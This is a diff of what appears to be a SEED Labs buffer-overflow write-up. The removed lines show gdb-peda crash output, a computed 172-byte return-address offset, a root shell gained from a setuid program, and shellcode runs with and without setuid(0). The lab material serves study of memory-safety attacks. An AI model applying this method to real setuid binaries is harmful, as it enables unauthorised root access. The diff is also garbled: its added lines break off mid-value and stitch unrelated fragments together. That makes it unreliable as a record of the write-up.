@@ -146,70 +146,7 @@ EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
    0x565562b5 <bof+8>:	sub    esp,0xa4
 [------------------------------------stack-------------------------------------]
 0000| 0xffffcb9c --> 0x565563f4 (<dummy_function+62>:	add    esp,0x10)
-0004| 0xffffcba0 --> 0xffffcfc3 --> 0x40a 
-0008| 0xffffcba4 --> 0x0 
-0012| 0xffffcba8 --> 0x3e8 
-0016| 0xffffcbac --> 0x565563c9 (<dummy_function+19>:	add    eax,0x2bef)
-0020| 0xffffcbb0 --> 0x0 
-0024| 0xffffcbb4 --> 0x0 
-0028| 0xffffcbb8 --> 0x0 
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-
-Breakpoint 1, 0x565562ad in bof ()
-gdb-peda$ pattern_create 300 badfile
-Writing pattern of 300 chars to filename "badfile"
-gdb-peda$ c
-Continuing.
-
-Program received signal SIGSEGV, Segmentation fault.
-[----------------------------------registers-----------------------------------]
-EAX: 0x1 
-EBX: 0x41417241 ('ArAA')
-ECX: 0xffffd0e0 ("fA%5A%KA%gA%6A%")
-EDX: 0xffffcc0d ("fA%5A%KA%gA%6A%")
-ESI: 0xf7fb4000 --> 0x1e6d6c 
-EDI: 0xf7fb4000 --> 0x1e6d6c 
-EBP: 0x74414156 ('VAAt')
-ESP: 0xffffcba0 ("AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
-EIP: 0x41574141 ('AAWA')
-EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-Invalid $PC address: 0x41574141
-[------------------------------------stack-------------------------------------]
-0000| 0xffffcba0 ("AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
-0004| 0xffffcba4 ("XAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
-0008| 0xffffcba8 ("AAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
-0012| 0xffffcbac ("AwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
-0016| 0xffffcbb0 ("ZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
-0020| 0xffffcbb4 ("AAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
-0024| 0xffffcbb8 ("AzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
-0028| 0xffffcbbc ("%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x41574141 in ?? ()
-```
-
-- We can see that the last value in `$EIP` register is `AAWA`. Therefore we just need to find this value in created pattern to find the final offset.
-
-```
-gdb-peda$ pattern_offset AAWA
-AAWA found at offset: 172
-```
-
-- To reach the return address, we just need 172 bytes arbitrary value and 4 bytes return address to get the shell as `root`.
-
-```
-[04/06/24]seed@VM:~/.../code$ ./stack-L2
-Input size: 207
-# id                                                                           
-uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
-# whoami                                                                       
-root
-```
-
-## Task 7
+0004| 0xffffcba0 --> 0xffffcf1
 - When running the program `a32.out` and `a64.out` with `setuid(0)`, we are running as the `root` user.
 
 ```
@@ -230,32 +167,7 @@ root
 # whoami                                                                       
 root
 # id                                                                           
-uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
-# exit
-```
-
-- When running the program `a32.out` and `a64.out` without `setuid(0)`, we are running as the `seed` user.
-```
-[04/06/24]seed@VM:~/.../shellcode$ make all 
-gcc -m32 -z execstack -o a32.out call_shellcode.c
-gcc -z execstack -o a64.out call_shellcode.c
-[04/06/24]seed@VM:~/.../shellcode$ ls
-a32.out  a64.out  call_shellcode.c  Makefile
-[04/06/24]seed@VM:~/.../shellcode$ ./a32.out 
-$ id                                                                           
-uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
-$ whoami                                                                       
-seed
-$ exit                                                                         
-[04/06/24]seed@VM:~/.../shellcode$ ./a64.out 
-$ whoami                                                                       
-seed
-$ id                                                                           
-uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
-$ exit
-```
-
-# Task 7
+uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),42
 
 - Before adding `setuid(0)`
 ```
